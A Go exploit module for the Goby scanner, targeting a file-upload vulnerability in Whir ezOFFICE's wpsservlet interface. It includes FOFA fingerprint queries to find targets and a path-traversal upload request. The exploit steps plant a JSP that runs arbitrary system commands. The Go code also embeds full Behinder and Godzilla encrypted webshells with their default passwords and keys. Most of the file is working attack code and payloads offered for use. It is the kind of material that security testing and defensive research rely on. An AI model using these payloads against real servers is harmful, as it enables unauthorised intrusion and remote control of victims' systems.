package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Whir ezOFFICE wpsservlet interface file upload vulnerability",
    "Description": "<p>Whir Network ezOFFICE is an OA office automation with good ease of use and more flexible system settings.</p><p>An attacker can exploit this vulnerability to upload malicious files, gain server permissions and perform malicious operations.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2023-02-22",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to upload malicious files, obtain server permissions and perform malicious operations.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6"
                },
                "data_type": "text",
                "data": "--803e058d60f347f7b3c17fa95228eca6\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"test.jsp\"\r\n\r\n<% out.println(\"ByTestZsf323408hfj0486\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n--803e058d60f347f7b3c17fa95228eca6--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Length: 0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/platform/portal/layout/test.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ByTestZsf323408hfj0486",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6"
                },
                "data_type": "text",
                "data": "--803e058d60f347f7b3c17fa95228eca6\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"test.jsp\"\r\n\r\n<%@ page contentType=\"text/html; charset=UTF-8\" import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\");if(cmd==null||cmd.equals(\"\")) cmd=\"whoami\";try {String name= System.getProperty(\"os.name\");String[] cmds =name!=null&&name.toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\",  cmd}:new String[]{\"sh\", \"-c\", cmd};InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();byte[] buf=new byte[1024];int len=0;ByteArrayOutputStream bout=new ByteArrayOutputStream();while ((len=in.read(buf))!=-1){bout.write(buf,0,len);}response.getWriter().write(new String(bout.toByteArray()));}catch(IOException e) {e.printStackTrace();}out.print(\"|TestFor9527|\");;new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--803e058d60f347f7b3c17fa95228eca6--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Length: 0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/platform/portal/layout/test.jsp?cmd={{{cmd}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "|TestFor9527|",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)\\|TestFor9527\\|"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE wpsservlet 接口文件上传漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户网络 ezOFFICE 是一款 OA 办公自动化，具有良好的易用性，系统设置更加灵活。<br></p><p>攻击者可以利用该漏洞上传恶意文件，获取服务器权限和执行恶意操作。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.wanhu.com.cn\">https://www.wanhu.com.cn</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞上传恶意文件，获取服务器权限和执行恶意操作。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Whir ezOFFICE wpsservlet interface file upload vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir Network ezOFFICE is an OA office automation with good ease of use and more flexible system settings.</p><p>An attacker can exploit this vulnerability to upload malicious files, gain server permissions and perform malicious operations.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to upload malicious files, obtain server permissions and perform malicious operations.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-08",
    "PocId": "10818"
}`
	sendShell98654JH := func(hostInfo *httpclient.FixUrl, fileName, content, url string) (*httpclient.HttpResponse, error) {
		var cfg *httpclient.RequestConfig
		if fileName == "" {
			cfg = httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
		} else {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a")
			cfg.Header.Store("Referer", hostInfo.FixedHostInfo)
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6")
			cfg.Data = fmt.Sprintf("--803e058d60f347f7b3c17fa95228eca6\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"%s\"\r\n\r\n%s\r\n--803e058d60f347f7b3c17fa95228eca6--", fileName, content)
		}
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return resp, err
		}
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if resp, err := sendShell98654JH(hostInfo, "test.jsp", "<% out.println(\"ByTestZsf323408hfj0486\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>", "/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp"); err == nil {
				if resp.StatusCode == 200 {
					url := "/defaultroot/platform/portal/layout/test.jsp"
					if resp1, err := sendShell98654JH(hostInfo, "", "", url); err == nil {
						return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "ByTestZsf323408hfj0486")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			content := goutils.B2S(ss.Params["content"])
			if attackType == "webshell" {
				webShell := goutils.B2S(ss.Params["webshell"])
				if webShell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webShell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				}
				fakeFileName := goutils.RandomHexString(6)
				fileName := fakeFileName + ".jsp"
				url := "/defaultroot/platform/portal/layout/" + fileName
				if resp, err := sendShell98654JH(expResult.HostInfo, fileName, content, "/defaultroot/wpsservlet?option=saveNewFile&newdocId="+fakeFileName+"&dir=../platform/portal/layout/&fileType=.jsp"); err == nil {
					if resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + url + "\n"
						if attackType != "custom" && webShell == "behinder" {
							expResult.Output += "Password: rebeyond\n"
							expResult.Output += "WebShell tool: Behinder v3.0\n"
						} else if attackType != "custom" && webShell == "godzilla" {
							expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
							expResult.Output += "WebShell tool: Godzilla v4.1\n"
						} else {
							fmt.Println("no")
						}
						expResult.Output += "Webshell type: jsp"
					}
				}
			} else if attackType == "custom" {
				fileName := goutils.B2S(ss.Params["fileName"])
				url := "/defaultroot/platform/portal/layout/" + fileName
				if resp, err := sendShell98654JH(expResult.HostInfo, fileName, content, "/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp"); err == nil {
					if resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = "漏洞利用成功\n"
						expResult.Output += "File URL: " + expResult.HostInfo.FixedHostInfo + url + "\n"
					} else {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				}
			}
			return expResult
		},
	))
}
